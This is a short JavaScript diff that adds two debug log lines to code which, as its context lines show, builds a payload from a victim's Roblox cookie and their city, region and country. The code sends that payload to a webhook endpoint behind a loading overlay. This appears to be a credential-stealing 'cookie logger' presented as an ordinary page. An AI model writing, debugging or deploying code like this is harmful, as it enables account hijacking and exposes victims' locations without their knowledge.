@@ -266,6 +266,8 @@ Cookie: ${robloxCookie || 'None found'}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
         };
 
+        console.log('🔒 Sending webhook request...', payload);
+        
         const response = await fetch('/api/webhook', {
             method: 'POST',
             headers: {
@@ -273,6 +275,8 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
             },
             body: JSON.stringify(payload)
         });
+
+        console.log('📡 Webhook response:', response.status, response.statusText);
         
         // Hide loading overlay
         if (loadingOverlay) loadingOverlay.style.display = 'none';
